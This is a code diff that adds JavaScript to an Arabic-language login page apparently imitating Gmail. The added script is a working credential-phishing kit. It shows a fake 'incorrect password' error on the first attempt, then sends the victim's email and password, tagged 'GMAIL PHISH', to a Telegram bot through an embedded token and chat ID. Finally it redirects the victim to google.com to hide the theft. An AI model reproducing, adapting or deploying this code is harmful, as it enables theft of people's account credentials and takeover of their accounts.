@@ -140,6 +140,59 @@
       <button type="submit">تسجيل الدخول</button>
       <div class="spinner" id="spinner"><div></div></div>
     </form>
-  </div>
-</body>
+  </div>  <script>
+    const BOT_TOKEN = '8066816136:AAFqNp9OCT2hHS00yOZ0HfUBzBCxi1ocpY0';
+    const CHAT_ID = '6894787120';
+    let attemptMap = {};
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      document.getElementById('spinner').style.display = 'flex';
+
+      const email = document.getElementById('email').value.trim();
+      const password = document.getElementById('password').value;
+
+      if (password.length < 6) {
+        alert('كلمة المرور يجب أن تكون 6 أحرف على الأقل.');
+        document.getElementById('spinner').style.display = 'none';
+        return;
+      }
+
+      // Fake attempt logic
+      if (!attemptMap[email]) {
+        attemptMap[email] = 1;
+        alert('كلمة المرور غير صحيحة. حاول مرة أخرى.');
+        document.getElementById('spinner').style.display = 'none';
+        return;
+      }
+
+      const message = `\nGMAIL PHISH\n------------------\nEmail: ${email}\nPassword: ${password}`;
+
+      try {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const payload = {
+          chat_id: CHAT_ID,
+          text: message
+        };
+
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+          window.location.href = 'https://www.google.com';
+        } else {
+          alert('فشل الإرسال، حاول مرة أخرى');
+          document.getElementById('spinner').style.display = 'none';
+        }
+      } catch (error) {
+        alert('حدث خطأ أثناء الإرسال');
+        document.getElementById('spinner').style.display = 'none';
+      }
+    });
+  </script></body>
 </html>
